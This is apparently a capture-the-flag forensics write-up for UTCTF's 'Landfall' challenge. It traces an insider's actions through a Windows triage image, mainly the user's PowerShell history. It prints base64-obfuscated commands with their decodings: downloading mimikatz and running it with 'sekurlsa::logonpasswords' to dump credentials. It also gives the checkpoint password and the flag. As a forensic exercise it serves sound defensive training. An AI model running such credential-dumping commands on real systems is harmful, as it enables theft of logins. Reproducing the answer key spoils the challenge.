---
title: "Landfall"
date: 2026-03-18T09:28:08+05:30
tags: ['Windows','Disk Analysis']
categories: ['for'] # for | crypto | osint | rev | pwn 
authors: ['pastimeplays']
description: "Noice"
---

# Landfall

<!-- DESCRIPTION -->
> You are a DFIR investigator in charge of collecting and analyzing information from a recent breach at UTCTF LLC. The higher ups have sent us a triage of the incident. Can you read the briefing and solve your part of the case?
>
> Triage Files: https://cdn.utctf.live/Modified_KAPE_Triage_Files.zip

points: `100`

solves: `296`

handouts: [`Modified_KAPE_Triage_Files.zip`, `briefing.txt`, `how-to-solve.txt`, `checkpointA.zip`]

author: `@jarpiano`

---

## Challenge Description

I'll let the challenge files describe this one - 

- `how-to-solve.txt`
```
To obtain the flag, you must obtain the password to the "Checkpoint A"
zip file. The password is associated with the problem assigned in the briefing.
```

- `briefing.txt`
```
Hello operator, in the .zip file is a triage of the desktop breached by the 
threat actors. It seems like they were able to physically login, so we think 
there's an insider threat amongst the employees.

Checkpoint A: What command did the threat actor attempt to execute to 
obtain credentials for privilege escalation? 

Hint: The password to Checkpoint A is ONLY the encoded portion. The password
is MD5 hash of this portion.
```

We are given a snapshot of the victim's C drive that doesn't look complete, but seems to contain all the important files we would need.

--- 

## Solution

### The Basic Structure
Before we get started, let's have a look at exactly what we're given, and what could be important.\
The first important things you see on opening the C drive are a `$MFT` file and a `$Recycle Bin` directory.

#### MFT
The MFT, or the Master File Table, is a plethora of information in a Windows system. It contains metadata for every file and directory of a Windows volume in the form of records (~1 kB each). Sometimes, if a file is small, the contents can also directly be stored in the MFT as "resident data".

Apart from these, we see four directories under user - `Administrator`, `jon`, `Public` and `robb`. I'll be assuming that Jon and Robb are the employees in question.


### Finding the Command
Our briefing quite clearly states that a command was executed for privelege escalation. This means that unless it was cleared, we can access the PowerShell history to see what went down.\
You can find it yourself by digging around a bit but I'll be dropping the path here.
```sh
C/Users/jon/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadline/ConsoleHost_history.txt
```

This contains the following command history - 
```powershell
powershell -nop -e dwBoAG8AYQBtAGkAIAAvAGEAbABsAA==
powershell -nop -e YwBkACAARABvAHcAbgBsAG8AYQBkAHMA
ls
cd Downlaods
cd DOwnloads
ls
powershell -e dwBnAGUAdAAgAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AZwBlAG4AdABpAGwAawBpAHcAaQAvAG0AaQBtAGkAawBhAHQAegAvAHIAZQBsAGUAYQBzAGUAcwAvAGQAbwB3AG4AbABvAGEAZAAvADIALgAyAC4AMAAtADIAMAAyADIAMAA5ADEAOQAvAG0AaQBtAGkAawBhAHQAegBfAHQAcgB1AG4AawAuAHoAaQBwAA==
ls
powershell -e dwBnAGUAdAAgAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AZwBlAG4AdABpAGwAawBpAHcAaQAvAG0AaQBtAGkAawBhAHQAegAvAHIAZQBsAGUAYQBzAGUAcwAvAGQAbwB3AG4AbABvAGEAZAAvADIALgAyAC4AMAAtADIAMAAyADIAMAA5ADEAOQAvAG0AaQBtAGkAawBhAHQAegBfAHQAcgB1AG4AawAuAHoAaQBwACAALQBPACAAbQBpAG0AaQBrAGEAdAB6AC4AegBpAHAA
ls
powershell -e -nop RQB4AHAAYQBuAGQALQBBAHIAYwBoAGkAdgBlACAAbQBpAG0AaQBrAGEAdAB6AC4AegBpAHAA
powershell -nop -e RQB4AHAAYQBuAGQALQBBAHIAYwBoAGkAdgBlACAAbQBpAG0AaQBrAGEAdAB6AC4AegBpAHAA
ls
powershell -nop -e QwA6AFwAVQBzAGUAcgBzAFwAagBvAG4AXABEAG8AdwBuAGwAbwBhAGQAcwBcAG0AaQBtAGkAawBhAHQAegBcAHgANgA0AFwAbQBpAG0AaQBrAGEAdAB6AC4AZQB4AGUAIAAiAHAAcgBpAHYAaQBsAGUAZwBlADoAOgBkAGUAYgB1AGcAIgAgACIAcwBlAGsAdQByAGwAcwBhADoAOgBsAG8AZwBvAG4AcABhAHMAcwB3AG8AcgBkAHMAIgAgACIAZQB4AGkAdAAiAA==
ls
```
Decoding these hidden commands show us - 
```powershell
whoami /all
cd Downloads
wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip -O mimikatz.zip
Expand-Archive mimikatz.zip
Expand-Archive mimikatz.zip
C:\Users\jon\Downloads\mimikatz\x64\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

The attacker downloaded and extracted `mimikatz_trunk.zip`, which is a tool used to extract credentials from Windows memory. The command used for the privilege escalation should refer to the last command used.\
Hashing this encoded portion with MD5 gives us - `4bf8c055590cb342b537db69c15b3f89`, which is the password for `checkpointA.zip`

--- 

```
utflag{4774ck3r5_h4v3_m4d3_l4ndf4ll}
```

